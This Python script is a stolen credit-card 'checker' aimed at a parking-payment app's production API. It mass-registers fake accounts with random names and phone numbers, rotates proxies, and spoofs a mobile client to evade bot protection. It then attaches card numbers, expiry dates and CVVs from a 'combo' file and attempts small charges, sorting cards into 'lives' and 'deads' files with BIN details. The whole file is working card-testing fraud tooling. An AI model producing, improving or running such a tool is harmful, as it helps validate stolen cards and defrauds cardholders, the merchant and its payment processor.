import os
import json
import time
import random
import threading
import requests
import cloudscraper
import string
from datetime import datetime

API_BASE = "https://parkingpay-api-prod.azurewebsites.net"
REGISTER_URL = f"{API_BASE}/api/app/usuarios/registro"
LOGIN_URL = f"{API_BASE}/api/auth"
TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"

PROXIES_FILE = "proxies.txt"
TOKENS_FILE = "tokens.txt"
COMBO_FILE = "combo.txt"
DEADS_FILE = "deads.txt"
LOGS_FILE = "logs_parking.txt"

lock = threading.Lock()

NOMBRES = [
    "Juan","Pedro","Luis","Carlos","Miguel","Jose","Francisco","Antonio","Alejandro","Javier",
    "Ricardo","Fernando","Roberto","Sergio","Arturo","Maria","Ana","Laura","Carmen","Rosa",
    "Guadalupe","Martha","Patricia","Gabriela","Alejandra","Adriana","Monica","Veronica","Claudia","Sandra"
]

APELLIDOS = [
    "Garcia","Lopez","Martinez","Rodriguez","Hernandez","Gonzalez","Perez","Sanchez",
    "Ramirez","Cruz","Flores","Morales","Vazquez","Jimenez","Torres","Reyes","Castillo","Ortiz","Mendoza","Ruiz"
]

DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"]

MONTOS = {
    "1": (1.0, "$1 MXN CARGO"),
    "2": (20.0, "$20 MXN ABONO"),
    "3": (50.0, "$50 MXN ABONO"),
    "4": (100.0, "$100 MXN ABONO")
}

TARJETAS_POR_CUENTA = {
    "1": 30,
    "2": 20,
    "3": 20,
    "4": 20
}

API_NO_DISPONIBLE = False

def random_string(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def random_phone():
    lada = random.choice(["33","55","81","449","222","477","686","664","612","667"])
    return lada + "".join(random.choices("0123456789", k=7))

def random_email():
    timestamp = int(time.time() * 1000) % 100000
    return f"{random_string(6)}{timestamp}@{random.choice(DOMINIOS)}"

def random_password():
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))

def format_proxy(s):
    if not s:
        return None
    s = s.strip()
    if s.startswith("http://") or s.startswith("https://"):
        return s
    parts = s.split(":")
    if len(parts) == 4:
        if "." in parts[2]:
            user, pwd, host, port = parts
        else:
            host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{s}"
    return None

def cargar_proxies():
    if not os.path.exists(PROXIES_FILE):
        return []
    with open(PROXIES_FILE) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]

def cargar_tokens():
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE) as f:
        return [l.strip() for l in f if l.strip()]

def guardar_token(t):
    with lock:
        with open(TOKENS_FILE, "a") as f:
            f.write(t + "\n")

def cargar_combo():
    if not os.path.exists(COMBO_FILE):
        return []
    with open(COMBO_FILE) as f:
        return [l.strip() for l in f if l.strip()]

def guardar_combo(ccs):
    with lock:
        with open(COMBO_FILE, "w") as f:
            for c in ccs:
                f.write(c + "\n")

def obtener_nombre_lives(bin_info, monto_label):
    bin_num = bin_info.get("bin", "000000")[:6] if bin_info else "000000"
    monto_num = monto_label.replace("$", "").replace(" MXN CARGO", "").replace(" MXN ABONO", "").strip()
    base = f"lives{bin_num}{monto_num}"
    if not os.path.exists(f"{base}.txt"):
        return f"{base}.txt"
    i = 1
    while os.path.exists(f"{base}({i}).txt"):
        i += 1
    return f"{base}({i}).txt"

def guardar_live(card, monto_label, bin_info):
    archivo = obtener_nombre_lives(bin_info, monto_label)
    info = " | ".join(f"{k}:{v}" for k, v in bin_info.items() if v) if bin_info else ""
    with lock:
        with open(archivo, "a") as f:
            f.write(f"{card} | {monto_label} | {info}\n")

def guardar_dead(card, error, bin_info):
    info = " | ".join(f"{k}:{v}" for k, v in bin_info.items() if v) if bin_info else ""
    with lock:
        with open(DEADS_FILE, "a") as f:
            f.write(f"{card} | {error} | {info}\n")

def log_to_file(msg, also_print=False):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    with lock:
        with open(LOGS_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    if also_print:
        print(line)

def log_response(title, response):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with lock:
        with open(LOGS_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"[{timestamp}] {title}\n")
            f.write(f"{'='*60}\n")
            f.write(f"Status: {response.status_code}\n")
            try:
                data = response.json()
                f.write(f"Body: {json.dumps(data, indent=2)}\n")
            except:
                f.write(f"Body: {response.text[:500]}\n")

def registrar_cuenta(proxy_url, intentos=3):
    for intento in range(intentos):
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True},
            delay=2
        )
        if proxy_url:
            scraper.proxies = {"http": proxy_url, "https": proxy_url}
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8"
        }
        nombre = random.choice(NOMBRES)
        apellido = random.choice(APELLIDOS)
        email = random_email()
        password = random_password()
        telefono = random_phone()
        datos = {
            "Nombre": nombre,
            "Apellidos": apellido,
            "Telefono": telefono,
            "CorreoElectronico": email,
            "Contrasena": password,
            "ConfirmarContrasena": password,
        }
        try:
            r = scraper.post(REGISTER_URL, json=datos, headers=headers, timeout=15)
            if r.status_code == 403 and "stopped" in r.text:
                log_to_file("API APAGADA")
                return None
            if r.status_code not in (200, 201):
                log_to_file(f"Registro fallido: {r.status_code} - {r.text[:100]}")
                time.sleep(2)
                continue
            login_data = {"CorreoElectronico": email, "Contrasena": password}
            r2 = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
            if r2.status_code in (200, 201):
                data = r2.json()
                token = data.get("token")
                if token:
                    log_to_file(f"Cuenta creada: {email}")
                    return token
            log_to_file(f"Login fallido: {r2.status_code}")
            time.sleep(1)
        except Exception as e:
            log_to_file(f"Error registro: {e}")
            time.sleep(2)
    return None

def crear_cuentas_para_check(cantidad, proxies_list):
    tokens = []
    for i in range(cantidad):
        proxy_url = format_proxy(random.choice(proxies_list)) if proxies_list else None
        token = registrar_cuenta(proxy_url)
        if token:
            guardar_token(token)
            tokens.append(token)
        time.sleep(random.uniform(0.5, 1.0))
    return tokens

def check_card(cc, mes, ano, cvv, monto, monto_nombre, token, proxy_url, bin_info=None):
    global API_NO_DISPONIBLE
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True},
        delay=2
    )
    if proxies:
        scraper.proxies = proxies
    headers = {
        "user-agent": "Dart/2.18 (dart:io)",
        "content-type": "application/json; charset=utf-8",
        "accept-encoding": "gzip",
        "authorization": token,
        "host": "parkingpay-api-prod.azurewebsites.net",
    }
    display = f"{cc}|{mes}|{ano}|{cvv}"
    try:
        r1 = scraper.post(
            TARJETAS_URL,
            json={"numero": cc, "expiracionMes": f"{int(mes):02d}", "expiracionYear": str(ano)},
            headers=headers,
            timeout=15
        )
        log_response(f"ASOCIAR {cc[-4:]}", r1)
        if r1.status_code == 403 and "stopped" in r1.text:
            return "error", display, "API APAGADA"
        if r1.status_code != 200:
            return "dead", display, "DEAD"
        try:
            data = r1.json()
            stripe_id = data.get("stripeCardId")
            if not stripe_id:
                return "dead", display, "DEAD"
        except:
            return "dead", display, "DEAD"
        if monto == 1.0:
            return "live", display, "$1 MXN CARGO"
        time.sleep(1)
        r2 = scraper.get(CONDUCTOR_URL, headers=headers, timeout=15)
        if r2.status_code != 200:
            return "dead", display, "DEAD"
        tarjeta_id = None
        for t in r2.json().get("cartera", {}).get("tarjetas", []):
            if t.get("stripeInfo", {}).get("stripeCardId") == stripe_id:
                tarjeta_id = t.get("tarjetaId")
                break
        if not tarjeta_id:
            return "dead", display, "DEAD"
        time.sleep(1)
        r3 = scraper.post(
            ABONO_URL,
            json={"tarjetaId": tarjeta_id, "porAbonar": monto},
            headers=headers,
            timeout=15
        )
        log_response(f"ABONO ${monto}", r3)
        if r3.status_code == 200:
            return "live", display, monto_nombre
        elif "No se pudo generar" in r3.text:
            return "dead", display, "Fondos insuficientes"
        else:
            error_msg = r3.text[:80] if r3.text else f"HTTP {r3.status_code}"
            if "20, 50 o 100" in error_msg:
                return "live", display, "$1 MXN CARGO"
            return "dead", display, "DEAD"
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
        API_NO_DISPONIBLE = True
        return "error", display, "API NO DISPONIBLE"
    except Exception as e:
        return "error", display, str(e)[:80]